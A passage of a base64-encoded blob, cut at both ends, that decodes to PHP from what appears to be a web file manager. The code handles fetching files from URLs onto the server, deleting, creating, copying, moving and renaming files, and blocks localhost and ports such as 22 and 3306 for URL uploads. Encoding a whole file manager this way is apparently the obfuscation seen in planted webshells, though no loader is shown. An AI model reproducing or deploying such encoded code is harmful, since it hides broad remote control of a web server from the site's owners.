mJiAhZW1wdHkoJF9QT1NUWydpbnB1dFBhc3N3b3JkMiddKSA/IHBhc3N3b3JkX2hhc2goJF9QT1NUWydpbnB1dFBhc3N3b3JkMiddLCBQQVNTV09SRF9ERUZBVUxUKSA6ICcnOw0KICAgICAgICBlY2hvICRyZXM7DQogICAgfQ0KDQogICAgLy91cGxvYWQgdXNpbmcgdXJsDQogICAgaWYoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddID09ICJ1cGxvYWQiICYmICFlbXB0eSgkX1JFUVVFU1RbInVwbG9hZHVybCJdKSkgew0KICAgICAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICAgICAgaWYgKEZNX1BBVEggIT0gJycpIHsNCiAgICAgICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgICAgIH0NCg0KICAgICAgICAgZnVuY3Rpb24gZXZlbnRfY2FsbGJhY2sgKCRtZXNzYWdlKSB7DQogICAgICAgICAgICBnbG9iYWwgJGNhbGxiYWNrOw0KICAgICAgICAgICAgZWNobyBqc29uX2VuY29kZSgkbWVzc2FnZSk7DQogICAgICAgIH0NCg0KICAgICAgICBmdW5jdGlvbiBnZXRfZmlsZV9wYXRoICgpIHsNCiAgICAgICAgICAgIGdsb2JhbCAkcGF0aCwgJGZpbGVpbmZvLCAkdGVtcF9maWxlOw0KICAgICAgICAgICAgcmV0dXJuICRwYXRoLiIvIi5iYXNlbmFtZSgkZmlsZWluZm8tPm5hbWUpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHVybCA9ICFlbXB0eSgkX1JFUVVFU1RbInVwbG9hZHVybCJdKSAmJiBwcmVnX21hdGNoKCJ8Xmh0dHAocyk/Oi8vLiskfCIsIHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbInVwbG9hZHVybCJdKSkgPyBzdHJpcHNsYXNoZXMoJF9SRVFVRVNUWyJ1cGxvYWR1cmwiXSkgOiBudWxsOw0KDQogICAgICAgIC8vcHJldmVudCAxMjcuKiBkb21haW4gYW5kIGtub3duIHBvcnRzDQogICAgICAgICRkb21haW4gPSBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9IT1NUKTsNCiAgICAgICAgJHBvcnQgPSBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9QT1JUKTsNCiAgICAgICAgJGtub3duUG9ydHMgPSBbMjIsIDIzLCAyNSwgMzMwNl07DQoNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9ebG9jYWxob3N0JHxeMTI3KD86XC5bMC05XSspezAsMn1cLlswLTldKyR8Xig/OjAqXDopKj86PzAqMSQvaSIsICRkb21haW4pIHx8IGluX2FycmF5KCRwb3J0LCAka25vd25Qb3J0cykpIHsNCiAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIlVSTCBpcyBub3QgYWxsb3dlZCIpOw0KICAgICAgICAgICAgZXZlbnRfY2FsbGJhY2soYXJyYXkoImZhaWwiID0+ICRlcnIpKTsNCiAgICAgICAgICAgIGV4aXQoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR1c2VfY3VybCA9IGZhbHNlOw0KICAgICAgICAkdGVtcF9maWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICJ1cGxvYWQtIik7DQogICAgICAgICRmaWxlaW5mbyA9IG5ldyBzdGRDbGFzcygpOw0KICAgICAgICAkZmlsZWluZm8tPm5hbWUgPSB0cmltKGJhc2VuYW1lKCR1cmwpLCAiLlx4MDAuLlx4MjAiKTsNCg0KICAgICAgICAkYWxsb3dlZCA9IChGTV9VUExPQURfRVhURU5TSU9OKSA/IGV4cGxvZGUoJywnLCBGTV9VUExPQURfRVhURU5TSU9OKSA6IGZhbHNlOw0KICAgICAgICAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZWluZm8tPm5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTikpOw0KICAgICAgICAkaXNGaWxlQWxsb3dlZCA9ICgkYWxsb3dlZCkgPyBpbl9hcnJheSgkZXh0LCAkYWxsb3dlZCkgOiB0cnVlOw0KDQogICAgICAgICRlcnIgPSBmYWxzZTsNCg0KICAgICAgICBpZighJGlzRmlsZUFsbG93ZWQpIHsNCiAgICAgICAgICAgICRlcnIgPSBhcnJheSgibWVzc2FnZSIgPT4gIkZpbGUgZXh0ZW5zaW9uIGlzIG5vdCBhbGxvd2VkIik7DQogICAgICAgICAgICBldmVudF9jYWxsYmFjayhhcnJheSgiZmFpbCIgPT4gJGVycikpOw0KICAgICAgICAgICAgZXhpdCgpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCEkdXJsKSB7DQogICAgICAgICAgICAkc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICB9IGVsc2UgaWYgKCR1c2VfY3VybCkgew0KICAgICAgICAgICAgQCRmcCA9IGZvcGVuKCR0ZW1wX2ZpbGUsICJ3Iik7DQogICAgICAgICAgICBAJGNoID0gY3VybF9pbml0KCR1cmwpOw0KICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX05PUFJPR1JFU1MsIGZhbHNlICk7DQogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIHRydWUpOw0KICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZJTEUsICRmcCk7DQogICAgICAgICAgICBAJHN1Y2Nlc3MgPSBjdXJsX2V4ZWMoJGNoKTsNCiAgICAgICAgICAgICRjdXJsX2luZm8gPSBjdXJsX2dldGluZm8oJGNoKTsNCiAgICAgICAgICAgIGlmICghJHN1Y2Nlc3MpIHsNCiAgICAgICAgICAgICAgICAkZXJyID0gYXJyYXkoIm1lc3NhZ2UiID0+IGN1cmxfZXJyb3IoJGNoKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBAY3VybF9jbG9zZSgkY2gpOw0KICAgICAgICAgICAgZmNsb3NlKCRmcCk7DQogICAgICAgICAgICAkZmlsZWluZm8tPnNpemUgPSAkY3VybF9pbmZvWyJzaXplX2Rvd25sb2FkIl07DQogICAgICAgICAgICAkZmlsZWluZm8tPnR5cGUgPSAkY3VybF9pbmZvWyJjb250ZW50X3R5cGUiXTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRjdHggPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoKTsNCiAgICAgICAgICAgIEAkc3VjY2VzcyA9IGNvcHkoJHVybCwgJHRlbXBfZmlsZSwgJGN0eCk7DQogICAgICAgICAgICBpZiAoISRzdWNjZXNzKSB7DQogICAgICAgICAgICAgICAgJGVyciA9IGVycm9yX2dldF9sYXN0KCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJHN1Y2Nlc3MpIHsNCiAgICAgICAgICAgICRzdWNjZXNzID0gcmVuYW1lKCR0ZW1wX2ZpbGUsIHN0cnRvayhnZXRfZmlsZV9wYXRoKCksICc/JykpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCRzdWNjZXNzKSB7DQogICAgICAgICAgICBldmVudF9jYWxsYmFjayhhcnJheSgiZG9uZSIgPT4gJGZpbGVpbmZvKSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICB1bmxpbmsoJHRlbXBfZmlsZSk7DQogICAgICAgICAgICBpZiAoISRlcnIpIHsNCiAgICAgICAgICAgICAgICAkZXJyID0gYXJyYXkoIm1lc3NhZ2UiID0+ICJJbnZhbGlkIHVybCBwYXJhbWV0ZXIiKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGV2ZW50X2NhbGxiYWNrKGFycmF5KCJmYWlsIiA9PiAkZXJyKSk7DQogICAgICAgIH0NCiAgICB9DQogICAgZXhpdCgpOw0KfQ0KDQovLyBEZWxldGUgZmlsZSAvIGZvbGRlcg0KaWYgKGlzc2V0KCRfR0VUWydkZWwnXSwgJF9QT1NUWyd0b2tlbiddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICAkZGVsID0gc3RyX3JlcGxhY2UoICcvJywgJycsIGZtX2NsZWFuX3BhdGgoICRfR0VUWydkZWwnXSApICk7DQogICAgaWYgKCRkZWwgIT0gJycgJiYgJGRlbCAhPSAnLi4nICYmICRkZWwgIT0gJy4nICYmIHZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgICAgICB9DQogICAgICAgICRpc19kaXIgPSBpc19kaXIoJHBhdGggLiAnLycgLiAkZGVsKTsNCiAgICAgICAgaWYgKGZtX3JkZWxldGUoJHBhdGggLiAnLycgLiAkZGVsKSkgew0KICAgICAgICAgICAgJG1zZyA9ICRpc19kaXIgPyBsbmcoJ0ZvbGRlcicpLicgPGI+JXM8L2I+ICcubG5nKCdEZWxldGVkJykgOiBsbmcoJ0ZpbGUnKS4nIDxiPiVzPC9iPiAnLmxuZygnRGVsZXRlZCcpOw0KICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCRtc2csIGZtX2VuYygkZGVsKSkpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1zZyA9ICRpc19kaXIgPyBsbmcoJ0ZvbGRlcicpLicgPGI+JXM8L2I+ICcubG5nKCdub3QgZGVsZXRlZCcpIDogbG5nKCdGaWxlJykuJyA8Yj4lczwvYj4gJy5sbmcoJ25vdCBkZWxldGVkJyk7DQogICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYoJG1zZywgZm1fZW5jKCRkZWwpKSwgJ2Vycm9yJyk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnSW52YWxpZCBmaWxlIG9yIGZvbGRlciBuYW1lJyksICdlcnJvcicpOw0KICAgIH0NCiAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8vIENyZWF0ZSBhIG5ldyBmaWxlL2ZvbGRlcg0KaWYgKGlzc2V0KCRfUE9TVFsnbmV3ZmlsZW5hbWUnXSwgJF9QT1NUWyduZXdmaWxlJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgJHR5cGUgPSB1cmxkZWNvZGUoJF9QT1NUWyduZXdmaWxlJ10pOw0KICAgICRuZXcgPSBzdHJfcmVwbGFjZSggJy8nLCAnJywgZm1fY2xlYW5fcGF0aCggc3RyaXBfdGFncyggJF9QT1NUWyduZXdmaWxlbmFtZSddICkgKSApOw0KICAgIGlmIChmbV9pc3ZhbGlkX2ZpbGVuYW1lKCRuZXcpICYmICRuZXcgIT0gJycgJiYgJG5ldyAhPSAnLi4nICYmICRuZXcgIT0gJy4nICYmIHZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdHlwZSA9PSAiZmlsZSIpIHsNCiAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoJHBhdGggLiAnLycgLiAkbmV3KSkgew0KICAgICAgICAgICAgICAgIGlmKGZtX2lzX3ZhbGlkX2V4dCgkbmV3KSkgew0KICAgICAgICAgICAgICAgICAgICBAZm9wZW4oJHBhdGggLiAnLycgLiAkbmV3LCAndycpIG9yIGRpZSgnQ2Fubm90IG9wZW4gZmlsZTogICcgLiAkbmV3KTsNCiAgICAgICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnRmlsZScpLicgPGI+JXM8L2I+ICcubG5nKCdDcmVhdGVkJyksIGZtX2VuYygkbmV3KSkpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIGV4dGVuc2lvbiBpcyBub3QgYWxsb3dlZCcpLCAnZXJyb3InKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0ZpbGUnKS4nIDxiPiVzPC9iPiAnLmxuZygnYWxyZWFkeSBleGlzdHMnKSwgZm1fZW5jKCRuZXcpKSwgJ2FsZXJ0Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoZm1fbWtkaXIoJHBhdGggLiAnLycgLiAkbmV3LCBmYWxzZSkgPT09IHRydWUpIHsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdGb2xkZXInKS4nIDxiPiVzPC9iPiAnLmxuZygnQ3JlYXRlZCcpLCAkbmV3KSk7DQogICAgICAgICAgICB9IGVsc2VpZiAoZm1fbWtkaXIoJHBhdGggLiAnLycgLiAkbmV3LCBmYWxzZSkgPT09ICRwYXRoIC4gJy8nIC4gJG5ldykgew0KICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0ZvbGRlcicpLicgPGI+JXM8L2I+ICcubG5nKCdhbHJlYWR5IGV4aXN0cycpLCBmbV9lbmMoJG5ldykpLCAnYWxlcnQnKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnRm9sZGVyJykuJyA8Yj4lczwvYj4gJy5sbmcoJ25vdCBjcmVhdGVkJyksIGZtX2VuYygkbmV3KSksICdlcnJvcicpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ludmFsaWQgY2hhcmFjdGVycyBpbiBmaWxlIG9yIGZvbGRlciBuYW1lJyksICdlcnJvcicpOw0KICAgIH0NCiAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8vIENvcHkgZm9sZGVyIC8gZmlsZQ0KaWYgKGlzc2V0KCRfR0VUWydjb3B5J10sICRfR0VUWydmaW5pc2gnXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgLy8gZnJvbQ0KICAgICRjb3B5ID0gdXJsZGVjb2RlKCRfR0VUWydjb3B5J10pOw0KICAgICRjb3B5ID0gZm1fY2xlYW5fcGF0aCgkY29weSk7DQogICAgLy8gZW1wdHkgcGF0aA0KICAgIGlmICgkY29weSA9PSAnJykgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnU291cmNlIHBhdGggbm90IGRlZmluZWQnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQogICAgLy8gYWJzIHBhdGggZnJvbQ0KICAgICRmcm9tID0gRk1fUk9PVF9QQVRIIC4gJy8nIC4gJGNvcHk7DQogICAgLy8gYWJzIHBhdGggdG8NCiAgICAkZGVzdCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkZGVzdCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCiAgICAkZGVzdCAuPSAnLycgLiBiYXNlbmFtZSgkZnJvbSk7DQogICAgLy8gbW92ZT8NCiAgICAkbW92ZSA9IGlzc2V0KCRfR0VUWydtb3ZlJ10pOw0KICAgICRtb3ZlID0gZm1fY2xlYW5fcGF0aCh1cmxkZWNvZGUoJG1vdmUpKTsNCiAgICAvLyBjb3B5L21vdmUvZHVwbGljYXRlDQogICAgaWYgKCRmcm9tICE9ICRkZXN0KSB7DQogICAgICAgICRtc2dfZnJvbSA9IHRyaW0oRk1fUEFUSCAuICcvJyAuIGJhc2VuYW1lKCRmcm9tKSwgJy8nKTsNCiAgICAgICAgaWYgKCRtb3ZlKSB7IC8vIE1vdmUgYW5kIHRvICE9IGZyb20gc28ganVzdCBwZXJmb3JtIG1vdmUNCiAgICAgICAgICAgICRyZW5hbWUgPSBmbV9yZW5hbWUoJGZyb20sICRkZXN0KTsNCiAgICAgICAgICAgIGlmICgkcmVuYW1lKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnTW92ZWQgZnJvbScpLicgPGI+JXM8L2I+ICcubG5nKCd0bycpLicgPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpKTsNCiAgICAgICAgICAgIH0gZWxzZWlmICgkcmVuYW1lID09PSBudWxsKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgb3IgZm9sZGVyIHdpdGggdGhpcyBwYXRoIGFscmVhZHkgZXhpc3RzJyksICdhbGVydCcpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYobG5nKCdFcnJvciB3aGlsZSBtb3ZpbmcgZnJvbScpLicgPGI+JXM8L2I+ICcubG5nKCd0bycpLicgPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpLCAnZXJyb3InKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsgLy8gTm90IG1vdmUgYW5kIHRvICE9IGZyb20gc28gY29weSB3aXRoIG9yaWdpbmFsIG5hbWUNCiAgICAgICAgICAgIGlmIChmbV9yY29weSgkZnJvbSwgJGRlc3QpKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnQ29waWVkIGZyb20nKS4nIDxiPiVzPC9iPiAnLmxuZygndG8nKS4nIDxiPiVzPC9iPicsIGZtX2VuYygkY29weSksIGZtX2VuYygkbXNnX2Zyb20pKSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0Vycm9yIHdoaWxlIGNvcHlpbmcgZnJvbScpLicgPGI+JXM8L2I+ICcubG5nKCd0bycpLicgPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpLCAnZXJyb3InKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgaWYgKCEkbW92ZSl7IC8vTm90IG1vdmUgYW5kIHRvID0gZnJvbSBzbyBkdXBsaWNhdGUNCiAgICAgICAgICAgICRtc2dfZnJvbSA9IHRyaW0oRk1fUEFUSCAuICcvJyAuIGJhc2VuYW1lKCRmcm9tKSwgJy8nKTsNCiAgICAgICAgICAgICRmbl9wYXJ0cyA9IHBhdGhpbmZvKCRmcm9tKTsNCiAgICAgICAgICAgICRleHRlbnNpb25fc3VmZml4ID0gJyc7DQogICAgICAgICAgICBpZighaXNfZGlyKCRmcm9tKSl7DQogICAgICAgICAgICAgICAkZXh0ZW5zaW9uX3N1ZmZpeCA9ICcuJy4kZm5fcGFydHNbJ2V4dGVuc2lvbiddOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgLy9DcmVhdGUgbmV3IG5hbWUgZm9yIGR1cGxpY2F0ZQ0KICAgICAgICAgICAgJGZuX2R1cGxpY2F0ZSA9ICRmbl9wYXJ0c1snZGlybmFtZSddLicvJy4kZm5fcGFydHNbJ2ZpbGVuYW1lJ10uJy0nLmRhdGUoJ1ltZEhpcycpLiRleHRlbnNpb25fc3VmZml4Ow0KICAgICAgICAgICAgJGxvb3BfY291bnQgPSAwOw0KICAgICAgICAgICAgJG1heF9sb29wID0gMTAwMDsNCiAgICAgICAgICAgIC8vIENoZWNrIGlmIGEgZmlsZSB3aXRoIHRoZSBkdXBsaWNhdGUgbmFtZSBhbHJlYWR5IGV4aXN0cywgaWYgc28sIG1ha2UgbmV3IG5hbWUgKGVkZ2UgY2FzZS4uLikNCiAgICAgICAgICAgIHdoaWxlKGZpbGVfZXhpc3RzKCRmbl9kdXBsaWNhdGUpICYgJGxvb3BfY291bnQgPCAkbWF4X2xvb3Apew0KICAgICAgICAgICAgICAgJGZuX3BhcnRzID0gcGF0aGluZm8oJGZuX2R1cGxpY2F0ZSk7DQogICAgICAgICAgICAgICAkZm5fZHVwbGljYXRlID0gJGZuX3BhcnRzWydkaXJuYW1lJ10uJy8nLiRmbl9wYXJ0c1snZmlsZW5hbWUnXS4nLWNvcHknLiRleHRlbnNpb25fc3VmZml4Ow0KICAgICAgICAgICAgICAgJGxvb3BfY291bnQrKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChmbV9yY29weSgkZnJvbSwgJGZuX2R1cGxpY2F0ZSwgRmFsc2UpKSB7DQogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCdDb3BpZWQgZnJvbSA8Yj4lczwvYj4gdG8gPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRmbl9kdXBsaWNhdGUpKSk7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignRXJyb3Igd2hpbGUgY29weWluZyBmcm9tIDxiPiVzPC9iPiB0byA8Yj4lczwvYj4nLCBmbV9lbmMoJGNvcHkpLCBmbV9lbmMoJGZuX2R1cGxpY2F0ZSkpLCAnZXJyb3InKTsNCiAgICAgICAgICAgIH0NCiAgICAgICB9DQogICAgICAgZWxzZXsNCiAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1BhdGhzIG11c3QgYmUgbm90IGVxdWFsJyksICdhbGVydCcpOw0KICAgICAgIH0NCiAgICB9DQogICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KfQ0KDQovLyBNYXNzIGNvcHkgZmlsZXMvIGZvbGRlcnMNCmlmIChpc3NldCgkX1BPU1RbJ2ZpbGUnXSwgJF9QT1NUWydjb3B5X3RvJ10sICRfUE9TVFsnZmluaXNoJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQoNCiAgICBpZighdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnSW52YWxpZCBUb2tlbi4nKSwgJ2Vycm9yJyk7DQogICAgfQ0KICAgIA0KICAgIC8vIGZyb20NCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCiAgICAvLyB0bw0KICAgICRjb3B5X3RvX3BhdGggPSBGTV9ST09UX1BBVEg7DQogICAgJGNvcHlfdG8gPSBmbV9jbGVhbl9wYXRoKCRfUE9TVFsnY29weV90byddKTsNCiAgICBpZiAoJGNvcHlfdG8gIT0gJycpIHsNCiAgICAgICAgJGNvcHlfdG9fcGF0aCAuPSAnLycgLiAkY29weV90bzsNCiAgICB9DQogICAgaWYgKCRwYXRoID09ICRjb3B5X3RvX3BhdGgpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1BhdGhzIG11c3QgYmUgbm90IGVxdWFsJyksICdhbGVydCcpOw0KICAgICAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQogICAgfQ0KICAgIGlmICghaXNfZGlyKCRjb3B5X3RvX3BhdGgpKSB7DQogICAgICAgIGlmICghZm1fbWtkaXIoJGNvcHlfdG9fcGF0aCwgdHJ1ZSkpIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2coJ1VuYWJsZSB0byBjcmVhdGUgZGVzdGluYXRpb24gZm9sZGVyJywgJ2Vycm9yJyk7DQogICAgICAgICAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQogICAgICAgIH0NCiAgICB9DQogICAgLy8gbW92ZT8NCiAgICAkbW92ZSA9IGlzc2V0KCRfUE9TVFsnbW92ZSddKTsNCiAgICAvLyBjb3B5L21vdmUNCiAgICAkZXJyb3JzID0gMDsNCiAgICAkZmlsZXMgPSAkX1BPU1RbJ2ZpbGUnXTsNCiAgICBpZiAoaXNfYXJyYXkoJGZpbGVzKSAmJiBjb3VudCgkZmlsZXMpKSB7DQogICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZikgew0KICAgICAgICAgICAgaWYgKCRmICE9ICcnKSB7DQogICAgICAgICAgICAgICAgJGYgPSBmbV9jbGVhbl9wYXRoKCRmKTsNCiAgICAgICAgICAgICAgICAvLyBhYnMgcGF0aCBmcm9tDQogICAgICAgICAgICAgICAgJGZyb20gPSAkcGF0aCAuICcvJyAuICRmOw0KICAgICAgICAgICAgICAgIC8vIGFicyBwYXRoIHRvDQogICAgICAgICAgICAgICAgJGRlc3QgPSAkY29weV90b19wYXRoIC4gJy8nIC4gJGY7DQogICAgICAgICAgICAgICAgLy8gZG8NCiAgICAgICAgICAgICAgICBpZiAoJG1vdmUpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlbmFtZSA9IGZtX3JlbmFtZSgkZnJvbSwgJGRlc3QpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHJlbmFtZSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRlcnJvcnMrKzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGlmICghZm1fcmNvcHkoJGZyb20sICRkZXN0KSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGVycm9ycysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICgkZXJyb3JzID09IDApIHsNCiAgICAgICAgICAgICRtc2cgPSAkbW92ZSA/ICdTZWxlY3RlZCBmaWxlcyBhbmQgZm9sZGVycyBtb3ZlZCcgOiAnU2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlcnMgY29waWVkJzsNCiAgICAgICAgICAgIGZtX3NldF9tc2coJG1zZyk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbXNnID0gJG1vdmUgPyAnRXJyb3Igd2hpbGUgbW92aW5nIGl0ZW1zJyA6ICdFcnJvciB3aGlsZSBjb3B5aW5nIGl0ZW1zJzsNCiAgICAgICAgICAgIGZtX3NldF9tc2coJG1zZywgJ2Vycm9yJyk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnTm90aGluZyBzZWxlY3RlZCcpLCAnYWxlcnQnKTsNCiAgICB9DQogICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KfQ0KDQovLyBSZW5hbWUNCmlmIChpc3NldCgkX1BPU1RbJ3JlbmFtZV9mcm9tJ10sICRfUE9TVFsncmVuYW1lX3RvJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgaWYoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgZm1fc2V0X21zZygiSW52YWxpZCBUb2tlbi4iLCAnZXJyb3InKTsNCiAgICB9DQogICAgLy8gb2xkIG5hbWUNCiAgICAkb2xkID0gdXJsZGVjb2RlKCRfUE9TVFsncmVuYW1lX2Zyb20nXSk7DQogICAgJG9sZCA9IGZtX2NsZWFuX3BhdGgoJG9sZCk7DQogICAgJG9sZCA9IHN0cl9yZXBsYWNlKCcvJywgJycsICRvbGQpOw0KICAgIC8vIG5ldyBuYW1lDQogICAgJG5ldyA9IHVybGRlY29kZSgkX1BPU1RbJ3JlbmFtZV90byddKTsNCiAgICAkbmV3ID0gZm1fY2xlYW5fcGF0aChzdHJpcF90YWdzKCRuZXcpKTsNCiAgICAkbmV3ID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJG5ldyk7DQogICAgLy8gcGF0aA0KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KICAgIC8vIHJlbmFtZQ0KICAgIGlmIChmbV9pc3ZhbGlkX2ZpbGVuYW1lKCRuZXcpICYmICRvbGQgI